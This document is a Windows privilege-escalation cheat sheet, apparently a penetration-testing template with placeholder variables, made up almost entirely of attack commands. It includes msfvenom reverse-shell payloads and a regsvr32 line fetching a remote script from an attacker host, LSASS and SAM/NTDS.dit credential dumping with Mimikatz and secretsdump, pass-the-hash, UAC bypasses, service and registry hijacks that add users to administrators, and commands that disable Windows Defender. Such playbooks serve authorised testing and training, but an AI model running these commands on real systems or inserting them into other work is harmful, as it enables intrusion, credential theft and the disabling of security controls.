# Élévation de privilèges - Windows

## Enumeration Scripts

```powershell
# WinPEAS
.\winPEASx64.exe
.\winPEASx64.exe quiet

# PowerUp
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=system

# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck

# Windows Exploit Suggester
systeminfo > systeminfo.txt
python windows-exploit-suggester.py --database {{date}}-mssb.xls --systeminfo systeminfo.txt
```

## Unquoted Service Paths

```powershell
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerUp
Get-ServiceUnquoted

# Exploit
echo 'payload' > "C:\Program Files\Vulnerable Path.exe"
sc stop {{service}}
sc start {{service}}
```

## Weak Service Permissions

```powershell
# Check service permissions
icacls "C:\Path\To\Service.exe"
accesschk.exe /accepteula -uwcqv {{user}} *

# Check service config
sc qc {{service}}

# Modify service
sc config {{service}} binpath= "cmd.exe /c net localgroup administrators {{user}} /add"
sc stop {{service}}
sc start {{service}}

# Change service binary
move "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"
echo 'malicious payload' > "C:\Path\To\Service.exe"
```

## Registry AutoRuns

```powershell
# Check autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions
accesschk.exe /accepteula "{{user}}" -kvuqsw HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Exploit
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Exploit /t REG_SZ /d "C:\temp\shell.exe"
```

## AlwaysInstallElevated

```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o shell.msi

# Install
msiexec /quiet /qn /i shell.msi
```

## DLL Hijacking

```powershell
# Find missing DLLs
Process Monitor (procmon.exe)
# Filter: Result is "NAME NOT FOUND", Path ends with ".dll"

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f dll -o hijack.dll

# Place DLL
copy hijack.dll "C:\Program Files\Application\missing.dll"
```

## Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Check permissions
icacls "C:\Path\To\Task\Script.bat"

# Modify task
echo 'malicious command' > "C:\Path\To\Task\Script.bat"

# Create scheduled task
schtasks /create /tn "Exploit" /tr "C:\temp\shell.exe" /sc onlogon /ru System
```

## Stored Credentials

```powershell
# Windows Credentials
cmdkey /list
runas /savecred /user:{{user}} "cmd.exe"

# Credential Manager
vaultcmd /listcreds:"Windows Credentials"

# SAM and SYSTEM
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
secretsdump.py -sam sam -system system LOCAL

# LSASS dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
pypykatz lsa minidump lsass.dmp

# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
```

## Token Impersonation

```powershell
# Check privileges
whoami /priv

# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
# JuicyPotato
JuicyPotato.exe -l {{port}} -p C:\temp\shell.exe -t * -c {{clsid}}

# RoguePotato
RoguePotato.exe -r {{lhost}} -e "C:\temp\shell.exe" -l {{port}}

# PrintSpoofer
PrintSpoofer.exe -i -c "C:\temp\shell.exe"

# GodPotato
GodPotato.exe -cmd "C:\temp\shell.exe"
```

## SeBackupPrivilege

```powershell
# Check privilege
whoami /priv

# Export SAM and SYSTEM
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Copy NTDS.dit
diskshadow
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
exec "cmd.exe" /c copy z:\Windows\NTDS\ntds.dit c:\temp\ntds.dit
delete shadows volume %temp%
reset
exit

# Extract hashes
secretsdump.py -sam sam -system system LOCAL
secretsdump.py -ntds ntds.dit -system system LOCAL
```

## SeRestorePrivilege

```powershell
# Check privilege
whoami /priv

# Modify service registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\{{service}}" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
```

## SeLoadDriverPrivilege

```powershell
# Check privilege
whoami /priv

# Load malicious driver
# Capcom.sys exploit
```

## Unattended Install Files

```powershell
# Search for unattend files
dir /s *sysprep.inf
dir /s *sysprep.xml
dir /s *unattended.xml
dir /s *unattend.xml

# Common locations
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
```

## Kernel Exploits

```powershell
# MS16-032
Invoke-MS16032.ps1

# MS16-135
.\MS16-135.exe

# CVE-2021-1675 (PrintNightmare)
.\CVE-2021-1675.ps1 -DLL .\shell.dll

# CVE-2021-36934 (HiveNightmare/SeriousSAM)
icacls C:\Windows\System32\config\SAM
```

## Insecure GUI Apps

```powershell
# Run as different user
runas /user:{{user}} "C:\Program Files\Application\app.exe"

# Inside GUI app
File > Open
# Navigate to: C:\Windows\System32\cmd.exe
```

## Service Binary Hijacking

```powershell
# Check service path
sc qc {{service}}

# Check permissions
icacls "C:\Path\To\Service.exe"

# Replace binary
move "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"
copy shell.exe "C:\Path\To\Service.exe"

# Restart service
sc stop {{service}}
sc start {{service}}
```

## Group Policy Preferences

```powershell
# Find GPP passwords
findstr /S /I cpassword \\{{domain}}\sysvol\*.xml

# Decrypt password
gpp-decrypt {{cpassword}}
```

## Pass-the-Hash

```powershell
# Mimikatz
mimikatz # sekurlsa::pth /user:{{user}} /domain:{{domain}} /ntlm:{{ntlm_hash}}

# Invoke-TheHash
Invoke-SMBExec -Target {{target_ip}} -Domain {{domain}} -Username {{user}} -Hash {{ntlm_hash}} -Command "{{command}}"

# CrackMapExec
crackmapexec smb {{target_ip}} -u {{user}} -H {{ntlm_hash}} -x "{{command}}"
```

## UAC Bypass

```powershell
# Fodhelper
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c {{command}}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# ComputerDefaults
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\temp\shell.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"

# UACME
akagi64.exe {{method_number}} "C:\temp\shell.exe"
```

## Windows Defender

```powershell
# Check status
Get-MpComputerStatus

# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Add exclusion
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionExtension "exe"
```

## AppLocker Bypass

```powershell
# Writable directories
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color

# regsvr32
regsvr32 /s /n /u /i:http://{{lhost}}/shell.sct scrobj.dll

# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.dll
```

## Windows Services

```powershell
# Create service
sc create {{service}} binPath= "C:\temp\shell.exe" start= auto
sc start {{service}}

# Modify service
sc config {{service}} binPath= "cmd.exe /c net localgroup administrators {{user}} /add"
sc stop {{service}}
sc start {{service}}
```

## Hot Potato

```powershell
# Windows 7/8/10/Server 2008/2012
.\potato.exe -ip {{local_ip}} -cmd "C:\temp\shell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

## Passwords in Files

```powershell
# Search for passwords
findstr /si password *.txt *.ini *.config *.xml
dir /s *pass* == *cred* == *vnc* == *.config*

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## LAPS

```powershell
# Check if LAPS is installed
dir "C:\Program Files\LAPS"

# Read LAPS password (if admin on another machine)
Get-AdmPwdPassword -ComputerName {{computer}}
```